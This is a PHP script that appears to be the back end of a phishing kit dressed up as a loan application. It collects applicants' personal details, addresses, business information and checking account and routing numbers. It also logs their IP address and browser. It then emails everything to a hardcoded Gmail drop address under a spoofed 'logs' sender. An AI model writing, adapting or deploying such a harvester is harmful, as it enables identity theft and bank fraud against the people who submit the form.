<?php

//include('email.php');

$email = trim($_POST['email']);
$firstname = trim($_POST['firstname']);
$lastname = trim($_POST['lastname']);
$areacode = trim($_POST['areacode']);
$phonenumber = trim($_POST['phonenumber']);
$age = trim($_POST['age']);
$gender = trim($_POST['gender']);
$street1 = trim($_POST['street1']);
$street2 = trim($_POST['street2']);
$city = trim($_POST['city']);
$state = trim($_POST['state']);
$postalcode = trim($_POST['postalcode']);
$typeofbiz = trim($_POST['typeofbiz']);
$businesslegalform = trim($_POST['businesslegalform']);
$nameofcompany = trim($_POST['nameofcompany']);
$nameofcompanyprincipal = trim($_POST['nameofcompanyprincipal']);
$companyaddress = trim($_POST['companyaddress']);
$companyphone = trim($_POST['companyphone']);
$bankname = trim($_POST['bankname']);
$bankduration = trim($_POST['bankduration']);
$checkingacctnumber = trim($_POST['checkingacctnumber']);
$routingnumber = trim($_POST['routingnumber']);
$currentloan = trim($_POST['currentloan']);
$loanamout = trim($_POST['loanamout']);
$specialreason = trim($_POST['specialreason']);
$referrer = trim($_POST['referrer']);
$moneyusage = trim($_POST['moneyusage']);


if ($email != null ) {
    $signal = '';
    if (isset($_POST['email'])) {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];


        $message .="<div><h3>Enter your email address</h3><p>".$email."</p></div>";
        $message .="<div><h3>First Name </h3><p>".$firstname."</p></div>";
        $message .="<div><h3>Last Name</h3><p>".$lastname."</p></div>";
        $message .="<div><h3>Area Code</h3><p>".$areacode."</p></div>";
        $message .="<div><h3>Phone Number</h3><p>".$phonenumber."</p></div>";
        $message .="<div><h3>Age </h3><p>".$age."</p></div>";
        $message .="<div><h3>Gender </h3><p>".$gender."</p></div>";
        $message .="<div><h3>Street Line 1</h3><p>".$street1."</p></div>";
        $message .="<div><h3>Street Line 2</h3><p>".$street2."</p></div>";
        $message .="<div><h3>City </h3><p>".$city."</p></div>";
        $message .="<div><h3>State / Province </h3><p>".$state."</p></div>";
        $message .="<div><h3>Postal / Zip Code</h3><p>".$postalcode."</p></div>";
        $message .="<div><h3>Type of Business </h3><p>".$typeofbiz."</p></div>";
        $message .="<div><h3>Legal form under Which Business Operates:</h3><p>".$businesslegalform."</p></div>";
        $message .="<div><h3>Name of parent Company: </h3><p>".$nameofcompany."</p></div>";
        $message .="<div><h3>Name of the company Principal Responsible for the business Transaction: </h3><p>".$nameofcompanyprincipal."</p></div>";
        $message .="<div><h3>Company Address:</h3><p>".$companyaddress."</p></div>";
        $message .="<div><h3>Company Phone No:</h3><p>".$companyphone."</p></div>";
        $message .="<div><h3>Bank Name</h3><p>".$bankname."</p></div>";
        $message .="<div><h3>How long have you been with your financial institution? :</h3><p>".$bankduration."</p></div>";
        $message .="<div><h3>Checking Account Number :</h3><p>".$checkingacctnumber."</p></div>";
        $message .="<div><h3>Routing number :</h3><p>".$routingnumber."</p></div>";
        $message .="<div><h3>Do you have a current Loan? :</h3><p>".$currentloan."</p></div>";
        $message .="<div><h3>If Yes, How much?</h3><p>".$loanamout."</p></div>";
        $message .="<div><h3>What unique things would seperate you from other Applicants applying for this money : </h3><p>".$specialreason."</p></div>";
        $message .="<div><h3>How did you hear about us :</h3><p>".$referrer."</p></div>";
        $message .="<div><h3>Describe in details how you would use this money ? :</h3><p>".$moneyusage."</p></div>";

        $message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $message .= "|------- -------------|\n";
        $send = "macjohnson3180@gmail.com";
        $subject = "Login : $ip";
        
        
        
        $headers  = 'MIME-Version: 1.0' . "\r\n"
        .'Content-type: text/html; charset=utf-8' . "\r\n"
        .'From: '. "logs@spii.com\r\n";
      
        mail($send, $subject, $message,$headers);
        $signal = 'ok';
        $msg = 'Message Send';
        echo $signal;
    } else {
        print_r(is_valid($email, $password));
        exit();
    }
}

?>